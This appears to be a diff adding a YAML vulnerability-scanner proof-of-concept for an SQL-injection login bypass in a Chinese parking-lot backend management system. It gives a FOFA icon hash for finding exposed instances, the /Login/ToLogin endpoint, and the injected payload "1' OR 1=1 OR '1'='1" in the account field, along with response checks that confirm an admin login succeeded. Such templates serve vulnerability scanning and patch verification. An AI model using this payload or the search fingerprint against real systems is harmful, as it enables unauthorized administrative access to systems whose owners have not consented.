@@ -1,0 +1,28 @@
+id: poc-yaml-safirm-login-sqli
+info:
+  name: 停车场后台管理系统 ToLogin SQL注入任意登录漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 停车场后台管理系统
+  fofa: icon_hash="938984120"
+variables:
+  t1: random_int(1000,999000)
+  t2: random_int(100,1000)
+requests:
+- method: POST
+  path: /Login/ToLogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: Admins_Account={{.t1}}&Admins_Pwd={{.t2}}
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Success\\\":false\") &&\n\
+    contains(headers,\"application/json\")\n"
+- method: POST
+  path: /Login/ToLogin
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: Admins_Account=1' OR 1=1 OR '1'='1&Admins_Pwd=
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Success\\\":true\") &&\n\
+    contains(body,\"\\\"Message\\\":\\\"登录成功\\\"\") &&\ncontains(headers,\"application/json\"\
+    )\n"
+transport: http
